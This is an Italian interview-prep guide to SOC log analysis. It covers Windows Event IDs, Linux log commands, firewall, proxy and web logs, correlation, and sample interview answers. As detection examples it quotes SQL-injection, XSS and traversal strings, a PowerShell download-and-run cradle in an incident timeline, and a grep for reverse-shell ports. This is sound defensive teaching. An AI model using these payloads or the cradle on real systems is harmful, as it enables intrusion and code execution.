# 📊 Log Analysis per SOC Analyst

> **Modulo 04** — Guida completa all'analisi dei log per la preparazione al colloquio SOC Analyst

---

## 📌 Cosa Sono i Log e Perché Sono Fondamentali

I **log** sono registrazioni cronologiche di eventi che avvengono all'interno di un sistema informatico, un'applicazione, un dispositivo di rete o un servizio. Ogni azione — un login, l'avvio di un processo, una connessione di rete, un errore — genera un record che viene salvato in un file di log.

### Perché sono fondamentali per un SOC Analyst

| Motivazione | Descrizione |
|---|---|
| **Visibilità** | I log sono la fonte primaria di informazione su ciò che accade nell'infrastruttura |
| **Rilevamento minacce** | Permettono di identificare attività sospette, anomalie e indicatori di compromissione (IoC) |
| **Incident Response** | Forniscono la timeline degli eventi per ricostruire cosa è successo durante un incidente |
| **Compliance** | Molte normative (GDPR, PCI-DSS, ISO 27001) richiedono la raccolta e conservazione dei log |
| **Forensics** | Sono prove digitali utilizzabili in indagini forensi |
| **Tuning** | Aiutano a ridurre i falsi positivi e migliorare le regole di detection nel SIEM |

> 💡 **Regola d'oro**: *"Se non è nei log, non è successo"*. Un SOC Analyst senza log è come un detective senza prove.

---

## 📂 Tipi di Log

### 1. Log del Sistema Operativo
Registrano eventi a livello di OS: avvio/arresto del sistema, installazione driver, errori hardware, aggiornamenti.

- **Windows**: Event Viewer → System, Application, Security
- **Linux**: `/var/log/syslog`, `/var/log/kern.log`, `/var/log/dmesg`

### 2. Log di Sicurezza
Registrano eventi relativi alla sicurezza: autenticazioni, autorizzazioni, modifiche a utenti e gruppi, accessi a risorse.

- **Windows**: Security Event Log
- **Linux**: `/var/log/auth.log` (Debian/Ubuntu), `/var/log/secure` (RHEL/CentOS)

### 3. Log Applicativi
Generati dalle applicazioni installate: database, software ERP, applicazioni web, antivirus.

- Formati variabili a seconda dell'applicazione
- Spesso in formato testo, JSON o XML

### 4. Log di Rete
Generati da dispositivi di rete: firewall, router, switch, IDS/IPS, proxy.

- **Firewall**: connessioni permesse/bloccate
- **IDS/IPS**: alert su traffico sospetto
- **Proxy**: richieste HTTP/HTTPS degli utenti

### 5. Log di Web Server
Generati da server web come Apache e Nginx: richieste HTTP, errori, accessi.

- **Access log**: ogni richiesta HTTP ricevuta
- **Error log**: errori del server e delle applicazioni

---

## 🪟 Windows Event Log

### Struttura di un Evento Windows

Ogni evento Windows contiene i seguenti campi principali:

| Campo | Descrizione |
|---|---|
| **Event ID** | Identificativo numerico univoco del tipo di evento |
| **Source** | Il componente o servizio che ha generato l'evento |
| **Level** | Gravità: Information, Warning, Error, Critical |
| **Date/Time** | Timestamp dell'evento |
| **Computer** | Nome del computer che ha generato l'evento |
| **User** | Account utente associato all'evento |
| **Log Name** | Categoria del log (Security, System, Application) |
| **Task Category** | Sottocategoria dell'evento |
| **Description** | Dettagli testuali dell'evento |

### Event ID Critici da Memorizzare

#### 🔐 Autenticazione e Accesso

**Event ID 4624 — Logon Riuscito**
- **Cosa significa**: Un utente ha effettuato l'accesso con successo
- **Perché è importante**: Monitorare accessi da IP o orari insoliti, accessi con account di servizio
- **Campi chiave**: `Logon Type`, `Account Name`, `Source Network Address`
- **Logon Types da conoscere**:
  - Type 2: Interattivo (locale)
  - Type 3: Rete (share, RPC)
  - Type 4: Batch
  - Type 5: Servizio
  - Type 7: Unlock
  - Type 10: RemoteInteractive (RDP)
  - Type 11: CachedInteractive

```
Esempio: Un 4624 con Logon Type 10 alle 3:00 AM da un IP esterno → potenziale accesso RDP non autorizzato
```

**Event ID 4625 — Logon Fallito**
- **Cosa significa**: Un tentativo di accesso non è andato a buon fine
- **Perché è importante**: Multipli 4625 dallo stesso IP/account → possibile brute force
- **Sub-status codes importanti**:
  - `0xC000006A`: Password errata
  - `0xC0000064`: Username inesistente
  - `0xC0000072`: Account disabilitato
  - `0xC0000234`: Account bloccato

```
Scenario: 50 eventi 4625 in 5 minuti con sub-status 0xC000006A per l'account "admin" 
→ Brute force attack in corso
```

**Event ID 4634 — Logoff**
- **Cosa significa**: Una sessione utente è stata terminata
- **Perché è importante**: Correlato con 4624 per calcolare la durata delle sessioni

**Event ID 4648 — Logon con Credenziali Esplicite**
- **Cosa significa**: Un utente ha usato credenziali diverse dalle proprie per accedere a una risorsa (es. `runas`)
- **Perché è importante**: Tecnica comune negli attacchi laterali (lateral movement). Un utente che usa credenziali di un admin è sospetto.
- **Campi chiave**: `Subject Account Name`, `Target Account Name`, `Target Server Name`

```
Scenario: L'utente "mario.rossi" usa le credenziali di "domain_admin" per accedere a un server critico
→ Possibile lateral movement o uso di credenziali rubate
```

**Event ID 4672 — Privilegi Speciali Assegnati al Logon**
- **Cosa significa**: Un utente ha effettuato l'accesso con privilegi amministrativi/elevati
- **Perché è importante**: Ogni accesso con privilegi elevati deve essere monitorato. Un utente normale che ottiene improvvisamente privilegi speciali è un red flag.

#### ⚙️ Processi

**Event ID 4688 — Nuovo Processo Creato**
- **Cosa significa**: Un nuovo processo è stato avviato
- **Perché è importante**: Fondamentale per rilevare l'esecuzione di malware, script PowerShell sospetti, strumenti di hacking
- **Campi chiave**: `New Process Name`, `Creator Process Name` (processo padre), `Command Line` (se abilitato)

```
Scenario: Processo "cmd.exe" → avvia "powershell.exe" → esegue "Invoke-Mimikatz"
→ Chiaro indicatore di credential dumping
```

> ⚠️ **Nota**: Per vedere la command line nei log, è necessario abilitare la policy "Include command line in process creation events"

**Event ID 4689 — Processo Terminato**
- **Cosa significa**: Un processo è stato chiuso
- **Perché è importante**: Correlato con 4688 per capire la durata di esecuzione dei processi

#### 👥 Gestione Account e Gruppi

**Event ID 4720 — Account Utente Creato**
- **Cosa significa**: Un nuovo account utente è stato creato
- **Perché è importante**: Creazione di account non autorizzati → persistence dell'attaccante

**Event ID 4722 — Account Utente Abilitato**
- **Cosa significa**: Un account precedentemente disabilitato è stato riattivato
- **Perché è importante**: Un attaccante potrebbe riabilitare account dormienti per avere accesso

**Event ID 4726 — Account Utente Eliminato**
- **Cosa significa**: Un account utente è stato cancellato
- **Perché è importante**: Potrebbe indicare tentativi di coprire le tracce

**Event ID 4732 — Membro Aggiunto a un Gruppo Locale di Sicurezza**
- **Cosa significa**: Un utente è stato aggiunto a un gruppo locale (es. Administrators)
- **Perché è importante**: Aggiunta a gruppi privilegiati → escalation of privileges

**Event ID 4756 — Membro Aggiunto a un Gruppo Universale di Sicurezza**
- **Cosa significa**: Un utente è stato aggiunto a un gruppo universale (es. Enterprise Admins in Active Directory)
- **Perché è importante**: Modifica a gruppi universali ha impatto su tutto il dominio AD

```
Scenario: Event 4732 → utente "temp_user" aggiunto al gruppo "Administrators" alle 2:00 AM
→ Privilege escalation sospetta
```

#### 🛡️ Sistema e Servizi

**Event ID 7045 — Servizio Installato nel Sistema**
- **Cosa significa**: Un nuovo servizio è stato installato
- **Perché è importante**: Molti malware si installano come servizi per ottenere persistence
- **Campi chiave**: `Service Name`, `Service File Name`, `Service Type`, `Service Start Type`

```
Scenario: Servizio con nome casuale "xyzSvc" installato con Service File Name che punta a C:\Temp\payload.exe
→ Malware persistence via servizio
```

**Event ID 1102 — Audit Log Cancellato**
- **Cosa significa**: Il registro Security è stato cancellato manualmente
- **Perché è importante**: **Red flag critico!** Gli attaccanti cancellano i log per eliminare le prove delle loro attività

```
Scenario: Event 1102 registrato durante un incidente attivo
→ L'attaccante sta cercando di coprire le sue tracce — Massima priorità
```

### 📋 Tabella Riassuntiva Event ID Windows

| Event ID | Categoria | Descrizione | Rilevanza per SOC |
|---|---|---|---|
| **4624** | Autenticazione | Logon riuscito | Monitorare Logon Type, IP sorgente, orari anomali |
| **4625** | Autenticazione | Logon fallito | Brute force, password spraying |
| **4634** | Autenticazione | Logoff | Correlazione durata sessioni |
| **4648** | Autenticazione | Logon con credenziali esplicite | Lateral movement, uso `runas` |
| **4672** | Autenticazione | Privilegi speciali assegnati | Accesso amministrativo da monitorare |
| **4688** | Processi | Nuovo processo creato | Esecuzione malware, comandi sospetti |
| **4689** | Processi | Processo terminato | Correlazione con 4688 |
| **4720** | Account | Account creato | Persistence dell'attaccante |
| **4722** | Account | Account abilitato | Riattivazione account dormienti |
| **4726** | Account | Account eliminato | Copertura tracce |
| **4732** | Gruppi | Membro aggiunto a gruppo locale | Privilege escalation |
| **4756** | Gruppi | Membro aggiunto a gruppo universale | Privilege escalation su dominio |
| **7045** | Servizi | Servizio installato | Malware persistence |
| **1102** | Audit | Audit log cancellato | ⚠️ Anti-forensics, copertura tracce |

---

## 🐧 Linux Logs

### File di Log Principali

| File | Distribuzione | Contenuto |
|---|---|---|
| `/var/log/syslog` | Debian/Ubuntu | Log di sistema generale — kernel, servizi, demoni |
| `/var/log/auth.log` | Debian/Ubuntu | Autenticazioni: login, sudo, SSH |
| `/var/log/secure` | RHEL/CentOS/Fedora | Equivalente di auth.log per RHEL-based |
| `/var/log/kern.log` | Debian/Ubuntu | Messaggi del kernel |
| `/var/log/messages` | RHEL/CentOS | Log di sistema generale |
| `/var/log/apache2/access.log` | Debian/Ubuntu | Log accessi Apache |
| `/var/log/nginx/access.log` | Tutte | Log accessi Nginx |
| `/var/log/fail2ban.log` | Tutte | Log di Fail2Ban (banning automatico) |

### journalctl — Systemd Journal

`journalctl` è lo strumento per interrogare i log di systemd, presente in tutte le distribuzioni moderne.

```bash
# Visualizzare tutti i log
journalctl

# Log dall'ultimo boot
journalctl -b

# Log di un servizio specifico
journalctl -u sshd

# Log degli ultimi 30 minuti
journalctl --since "30 minutes ago"

# Log di un intervallo temporale
journalctl --since "2024-01-15 08:00:00" --until "2024-01-15 12:00:00"

# Seguire i log in tempo reale (come tail -f)
journalctl -f

# Solo messaggi di errore o superiori
journalctl -p err

# Log in formato JSON
journalctl -o json-pretty
```

### Comandi Essenziali per Analisi Log Linux

#### `grep` — Ricerca di pattern

```bash
# Cercare tentativi di login falliti SSH
grep "Failed password" /var/log/auth.log

# Cercare login riusciti SSH
grep "Accepted password" /var/log/auth.log

# Ricerca case-insensitive
grep -i "error" /var/log/syslog

# Mostrare le 3 righe prima e dopo il match (contesto)
grep -B3 -A3 "Failed password" /var/log/auth.log

# Cercare usando regex: IP addresses
grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' /var/log/auth.log

# Invertire la ricerca (mostrare righe che NON contengono il pattern)
grep -v "INFO" /var/log/syslog

# Contare le occorrenze
grep -c "Failed password" /var/log/auth.log
```

#### `awk` — Elaborazione testo strutturato

```bash
# Estrarre solo gli IP sorgente dal log (campo 11 in auth.log)
awk '/Failed password/ {print $11}' /var/log/auth.log

# Estrarre username e IP dai tentativi falliti
awk '/Failed password/ {print "User:", $9, "IP:", $11}' /var/log/auth.log

# Contare i tentativi per IP
awk '/Failed password/ {print $11}' /var/log/auth.log | sort | uniq -c | sort -rn
```

#### `cut` — Estrarre campi specifici

```bash
# Estrarre il timestamp (primi 15 caratteri) da syslog
cut -c1-15 /var/log/syslog

# Estrarre campi separati da delimitatore
cut -d' ' -f1-3,5 /var/log/auth.log
```

#### `sort`, `uniq`, `wc` — Aggregazione e conteggio

```bash
# Pipeline completa: trovare i top 10 IP con più login falliti
grep "Failed password" /var/log/auth.log | \
  awk '{print $11}' | \
  sort | \
  uniq -c | \
  sort -rn | \
  head -10

# Contare il numero totale di righe
wc -l /var/log/auth.log

# Contare eventi unici per ora
awk '{print $1, $2, substr($3,1,2)":00"}' /var/log/auth.log | sort | uniq -c
```

#### `tail -f` — Monitoraggio in tempo reale

```bash
# Seguire un log in tempo reale
tail -f /var/log/auth.log

# Seguire più file contemporaneamente
tail -f /var/log/auth.log /var/log/syslog

# Mostrare le ultime 100 righe e continuare a seguire
tail -n 100 -f /var/log/syslog
```

### 🔍 Esempi Pratici di Ricerca nei Log Linux

**Scenario 1: Investigare un brute force SSH**
```bash
# 1. Verificare quanti tentativi falliti ci sono
grep -c "Failed password" /var/log/auth.log

# 2. Identificare gli IP attaccanti
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -5

# 3. Verificare se qualche tentativo è andato a buon fine
grep "Accepted password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# 4. Controllare gli account target
grep "Failed password" /var/log/auth.log | awk '{print $9}' | sort | uniq -c | sort -rn
```

**Scenario 2: Verificare l'uso di sudo sospetto**
```bash
# Cercare tutti gli usi di sudo
grep "sudo" /var/log/auth.log

# Cercare comandi sudo specifici
grep "COMMAND=" /var/log/auth.log | grep -i "passwd\|useradd\|visudo\|chmod 777"

# Cercare sudo falliti
grep "authentication failure" /var/log/auth.log | grep "sudo"
```

**Scenario 3: Cercare connessioni a IP sospetti nei log di rete**
```bash
# Cercare un IP specifico in tutti i log
grep -r "192.168.1.100" /var/log/

# Cercare connessioni su porte non standard
grep -E ":(4444|5555|8888|9999)" /var/log/syslog
```

---

## 🔥 Log di Firewall

### Struttura di un Log Firewall

I log di firewall registrano ogni connessione che attraversa (o tenta di attraversare) il dispositivo. I campi principali sono:

| Campo | Descrizione | Esempio |
|---|---|---|
| **Timestamp** | Data e ora dell'evento | 2024-01-15 14:32:01 |
| **Source IP** | Indirizzo IP sorgente | 10.0.1.50 |
| **Destination IP** | Indirizzo IP destinazione | 203.0.113.25 |
| **Source Port** | Porta sorgente | 49152 |
| **Destination Port** | Porta destinazione | 443 |
| **Protocol** | Protocollo utilizzato | TCP, UDP, ICMP |
| **Action** | Azione del firewall | ALLOW, DENY, DROP, REJECT |
| **Rule** | Regola che ha matchato | Rule_ID_42 |
| **Bytes/Packets** | Volume di dati | 1520 bytes |
| **Direction** | Direzione del traffico | Inbound, Outbound |

### Esempio di Log Firewall (formato iptables)

```
Jan 15 14:32:01 fw01 kernel: [IPTABLES-DROP] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e 
SRC=185.220.101.34 DST=10.0.1.10 LEN=60 TOS=0x00 PROTO=TCP SPT=54321 DPT=22 
WINDOW=64240 SYN
```

**Interpretazione**: Il firewall ha bloccato (DROP) un tentativo di connessione TCP SYN dall'IP `185.220.101.34` (porta 54321) verso il server interno `10.0.1.10` sulla porta 22 (SSH).

### Cosa Cercare nei Log Firewall

- **Port scan**: Molte connessioni DROP dalla stessa sorgente verso porte diverse
- **Connessioni outbound sospette**: Connessioni in uscita verso IP in blacklist o porte non standard (C2)
- **Traffico su porte anomale**: DNS su porta non-53, HTTPS su porta non-443
- **Volume anomalo**: Picchi di traffico → possibile data exfiltration
- **Connessioni bloccate ripetitive**: Possibile malware che tenta di raggiungere il C2

---

## 🌐 Log di Proxy e Web Server

### Log di Apache (Combined Log Format)

```
192.168.1.50 - mario [15/Jan/2024:14:32:01 +0100] "GET /admin/dashboard HTTP/1.1" 200 5234 
"https://www.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

| Campo | Valore | Significato |
|---|---|---|
| IP Client | 192.168.1.50 | Chi ha fatto la richiesta |
| Identity | - | Identità RFC 1413 (raramente usato) |
| Utente | mario | Utente autenticato |
| Timestamp | 15/Jan/2024:14:32:01 +0100 | Quando è avvenuta la richiesta |
| Richiesta | GET /admin/dashboard HTTP/1.1 | Metodo, URI, protocollo |
| Status Code | 200 | Codice di risposta HTTP |
| Dimensione | 5234 | Byte della risposta |
| Referer | https://www.example.com/login | Pagina di provenienza |
| User-Agent | Mozilla/5.0... | Browser/client utilizzato |

### Log di Nginx

Il formato di default di Nginx è molto simile a quello di Apache:

```
10.0.1.25 - - [15/Jan/2024:14:35:22 +0100] "POST /api/login HTTP/1.1" 401 143 
"-" "python-requests/2.28.1"
```

> ⚠️ **Red flag**: User-Agent `python-requests` che tenta login → potrebbe essere uno script automatizzato di brute force

### Cosa Cercare nei Log Web

| Pattern Sospetto | Possibile Attacco |
|---|---|
| Molti 401/403 dallo stesso IP | Brute force, tentativo di accesso non autorizzato |
| Richieste con `../`, `%2e%2e` | Directory traversal |
| Richieste con `' OR 1=1`, `UNION SELECT` | SQL Injection |
| Richieste con `<script>`, `alert(` | Cross-Site Scripting (XSS) |
| User-Agent insoliti (curl, python, nikto, sqlmap) | Scanning automatizzato |
| Richieste POST massicce su /upload | Tentativo di upload malware |
| Status 500 ripetuti | Possibile exploitation in corso |

### Log di Proxy

I proxy log mostrano le richieste web degli utenti interni verso Internet:

```
1705322001.123    125 10.0.1.50 TCP_MISS/200 15234 GET https://suspicious-domain.xyz/payload.bin 
- DIRECT/203.0.113.99 application/octet-stream
```

**Campi importanti del proxy log**:
- **IP interno**: Chi ha fatto la richiesta
- **URL completo**: Dove l'utente è andato
- **Status/Action**: Se la richiesta è stata permessa o bloccata
- **Content-Type**: Tipo di contenuto scaricato
- **Bytes**: Dimensione del download

---

## 🔗 Tecniche di Correlazione

### 1. Timeline Analysis

Costruire una **timeline cronologica** degli eventi combinando log di fonti diverse per ricostruire l'intera catena di attacco.

```
14:30:01  [Email Gateway]  Email di phishing ricevuta da mario.rossi@azienda.com
14:31:15  [Proxy Log]      mario.rossi accede a https://malicious-site.com/doc.docm
14:31:22  [Proxy Log]      Download file: doc.docm (application/msword)
14:32:05  [Endpoint EDR]   Processo WINWORD.EXE avvia powershell.exe
14:32:08  [Windows 4688]   powershell.exe esegue: IEX(New-Object Net.WebClient).DownloadString(...)
14:32:15  [Firewall Log]   Connessione outbound verso 185.220.101.34:443 (ALLOW)
14:33:01  [Windows 4648]   mario.rossi usa credenziali di admin_service
14:33:30  [Windows 4624]   Logon Type 3 su SERVER-DC01 con account admin_service
14:34:00  [Windows 4732]   admin_service aggiunto al gruppo Domain Admins
```

### 2. Aggregazione

Raggruppare eventi per trovare pattern:

```bash
# Aggregare login falliti per IP nell'ultima ora
grep "Failed password" /var/log/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn

# Risultato:
#   847  185.220.101.34    ← Brute force evidente
#    23  10.0.1.50
#     3  10.0.1.25
```

### 3. Pivot

Partire da un indicatore noto e "ruotare" (pivot) per trovare attività correlate:

1. **IoC iniziale**: IP malevolo `185.220.101.34`
2. **Pivot 1**: Cercare questo IP nei firewall log → scopri che `10.0.1.50` ci si è connesso
3. **Pivot 2**: Cercare `10.0.1.50` nei proxy log → scopri che ha scaricato `malware.exe`
4. **Pivot 3**: Cercare l'hash di `malware.exe` nell'EDR → scopri altri 3 host infetti
5. **Pivot 4**: Cercare quegli host nei log Windows → scopri movimenti laterali

---

## 🛠️ Strumenti per Log Analysis

| Strumento | Tipo | Uso |
|---|---|---|
| **Notepad++** | Editor di testo | Ricerca rapida in file di log con regex, evidenziazione sintassi |
| **CyberChef** | Tool web/offline | Decodifica Base64, URL encoding, estrazione pattern da log |
| **grep/awk/sed** | CLI Linux | Analisi rapida e potente di log testuali |
| **PowerShell** | CLI Windows | `Get-WinEvent`, `Get-EventLog` per analisi log Windows |
| **SIEM** (Splunk, QRadar, Sentinel, Elastic) | Piattaforma | Aggregazione centralizzata, correlazione, alerting, dashboard |
| **Wireshark** | Network analyzer | Analisi log di rete in formato PCAP |
| **ELK Stack** (Elasticsearch, Logstash, Kibana) | Piattaforma | Raccolta, indicizzazione e visualizzazione log |
| **Chainsaw** | Tool forensic | Analisi rapida di file EVTX (Windows Event Log) |
| **EvtxECmd** (Eric Zimmerman) | Tool forensic | Parsing di file EVTX per analisi forense |

### Esempio PowerShell per analisi Windows Event Log

```powershell
# Cercare login falliti nelle ultime 24 ore
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4625
    StartTime = (Get-Date).AddDays(-1)
} | Select-Object TimeCreated, Message | Format-List

# Cercare nuovi servizi installati
Get-WinEvent -FilterHashtable @{
    LogName = 'System'
    ID = 7045
} | Select-Object TimeCreated, 
    @{N='ServiceName';E={$_.Properties[0].Value}},
    @{N='ServicePath';E={$_.Properties[1].Value}}

# Cercare log cancellati
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 1102
}
```

---

## 🎯 Domande da Colloquio

### D1: Quali sono gli Event ID Windows più importanti da monitorare e perché?

**Risposta**: Gli Event ID fondamentali si dividono in categorie:
- **Autenticazione**: 4624 (login riuscito — controllare Logon Type e IP sorgente), 4625 (login fallito — rilevare brute force), 4648 (credenziali esplicite — lateral movement)
- **Privilegi**: 4672 (privilegi speciali — monitorare accessi admin)
- **Processi**: 4688 (nuovo processo — esecuzione malware, con command line se abilitata)
- **Account/Gruppi**: 4720 (account creato), 4732/4756 (membro aggiunto a gruppi — privilege escalation)
- **Persistenza**: 7045 (servizio installato — malware persistence)
- **Anti-forensics**: 1102 (log cancellato — red flag critico)

Ogni Event ID va correlato con il contesto: orario, IP sorgente, account coinvolto.

---

### D2: Come indagheresti un sospetto attacco brute force su un server Windows?

**Risposta**: Seguirei questi passi:
1. **Cerco eventi 4625** (login falliti) filtrando per il server target nel SIEM
2. **Aggrego per IP sorgente** per identificare da dove arrivano i tentativi
3. **Controllo la frequenza**: molti 4625 in poco tempo confermano il brute force
4. **Verifico i sub-status codes**: `0xC000006A` (password errata) vs `0xC0000064` (utente inesistente — password spraying se gli utenti cambiano)
5. **Controllo se c'è un 4624** dopo i 4625 dallo stesso IP → l'attaccante ha avuto successo?
6. **Verifico il Logon Type**: Type 3 (rete), Type 10 (RDP)
7. **Controllo l'IP sorgente** su threat intelligence (VirusTotal, AbuseIPDB)
8. **Azione**: Se in corso, blocco l'IP nel firewall e resetto la password dell'account compromesso

---

### D3: Qual è la differenza tra /var/log/auth.log e /var/log/syslog in Linux?

**Risposta**: `/var/log/auth.log` (su distribuzioni Debian/Ubuntu) registra specificamente gli eventi di autenticazione: login SSH, uso di sudo, cambi password, PAM (Pluggable Authentication Modules). È l'equivalente del Security Event Log di Windows. `/var/log/syslog` è il log di sistema generale che raccoglie messaggi da tutti i servizi e dal kernel — è molto più ampio e include informazioni su demoni, cron jobs, errori di sistema. Su distribuzioni RHEL/CentOS, l'equivalente di auth.log è `/var/log/secure` e l'equivalente di syslog è `/var/log/messages`.

---

### D4: Come costruiresti una timeline di un incidente usando log di fonti diverse?

**Risposta**: Per costruire una timeline:
1. **Identifico le fonti**: raccolgo log da SIEM, firewall, proxy, endpoint (EDR/Windows Events), email gateway
2. **Normalizzo i timestamp**: mi assicuro che tutti siano nello stesso fuso orario (preferibilmente UTC)
3. **Identifico un punto di partenza**: può essere un alert, un IoC, un IP sospetto
4. **Eseguo pivot**: dal punto di partenza cerco correlazioni in tutte le fonti
5. **Ordino cronologicamente**: costruisco una sequenza precisa di eventi
6. **Identifico la kill chain**: mappo gli eventi sulle fasi dell'attacco (initial access → execution → persistence → lateral movement → exfiltration)
7. **Documento**: creo un report con la timeline completa e le evidenze per ogni fase

Lo strumento ideale è il SIEM, che già normalizza e correla i log automaticamente.

---

### D5: Cosa indicheresti come sospetto nei log di un web server?

**Risposta**: Pattern sospetti nei log di un web server:
- **Molti errori 401/403**: tentativi di accesso non autorizzato o brute force su pagine protette
- **Richieste con pattern di injection**: `' OR 1=1`, `UNION SELECT` (SQL injection), `<script>` (XSS), `../../etc/passwd` (directory traversal)
- **User-Agent anomali**: `sqlmap`, `nikto`, `python-requests`, `curl` — indicano scanning automatizzato
- **Richieste POST verso endpoint insoliti**: possibile upload di webshell
- **Status 500 in massa**: possibile exploitation di una vulnerabilità
- **Accesso a file sensibili**: richieste per `.env`, `wp-config.php`, `web.config`, `.git/`
- **Volume anomalo di richieste da un singolo IP**: DDoS o scraping aggressivo

---

### D6: Cosa faresti se vedessi l'Event ID 1102 (Audit Log Cancellato)?

**Risposta**: L'Event ID 1102 è un **red flag critico** perché indica che qualcuno ha cancellato il registro Security di Windows. Le mie azioni sarebbero:
1. **Verifico chi ha cancellato il log**: il campo `Subject` indica l'account che ha eseguito la cancellazione
2. **Controllo il contesto temporale**: se è avvenuto durante un incidente attivo, è quasi certamente un'azione dell'attaccante
3. **Escalo immediatamente**: questo evento richiede attenzione urgente
4. **Cerco altre fonti di log**: SIEM (che ha una copia dei log), Sysmon, EDR — l'attaccante potrebbe non aver cancellato tutto
5. **Isolo la macchina**: potrebbe essere compromessa
6. **Preservo le evidenze**: forensic copy del disco prima di qualsiasi azione di remediation

---

### D7: Come usi grep e awk insieme per analizzare log in ambiente Linux?

**Risposta**: `grep` e `awk` sono complementari:
- **grep** filtra le righe che contengono un pattern specifico
- **awk** estrae e manipola campi specifici dalle righe filtrate

Esempio pratico — trovare i top 10 IP che tentano brute force SSH:
```bash
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -10
```

Questo pipeline: filtra solo i login falliti (grep) → estrae l'IP (awk, campo 11) → ordina (sort) → conta le occorrenze uniche (uniq -c) → ordina per numero decrescente (sort -rn) → prende i top 10 (head).

Un altro esempio — cercare connessioni SSH riuscite da IP esterni:
```bash
grep "Accepted password" /var/log/auth.log | awk '$11 !~ /^10\./ && $11 !~ /^192\.168\./ {print $1,$2,$3,$9,$11}'
```

---

### D8: Qual è la differenza tra un SIEM e l'analisi manuale dei log? Quando usi uno o l'altro?

**Risposta**: 
- **SIEM** (es. Splunk, QRadar, Sentinel): aggrega log da centinaia di fonti, normalizza i formati, correla automaticamente gli eventi, genera alert basati su regole, offre dashboard e report. È essenziale per operazioni SOC su larga scala.
- **Analisi manuale** (grep, awk, PowerShell, Notepad++): utile per indagini mirate su singoli sistemi, quando il SIEM non ha un parser per quel formato, per verificare raw data, o per incidenti su sistemi isolati.

In pratica: il SIEM è il primo strumento — ti segnala gli alert e ti permette di investigare con query. L'analisi manuale serve quando devi andare più in profondità, esaminare file EVTX esportati, analizzare log non integrati nel SIEM, o durante incident response su macchine isolate dalla rete.

---

### D9: Come identificheresti un lateral movement nei log?

**Risposta**: Il lateral movement lascia tracce in diversi tipi di log:
- **Windows 4648**: logon con credenziali esplicite — un utente usa credenziali di un altro account
- **Windows 4624 Logon Type 3**: accesso di rete a share o servizi su altri server
- **Windows 4624 Logon Type 10**: sessione RDP verso un altro server
- **Windows 4672**: privilegi speciali assegnati su un server diverso dalla workstation dell'utente
- **Windows 4688**: esecuzione di tool come `PsExec`, `wmic`, `net use`, `mstsc`
- **Firewall**: connessioni interne su porte anomale (445 SMB, 5985/5986 WinRM, 3389 RDP)
- **Pattern temporale**: stesse credenziali usate su più server in rapida successione

La chiave è correlare eventi da più fonti e cercare accessi "a catena" da host a host.
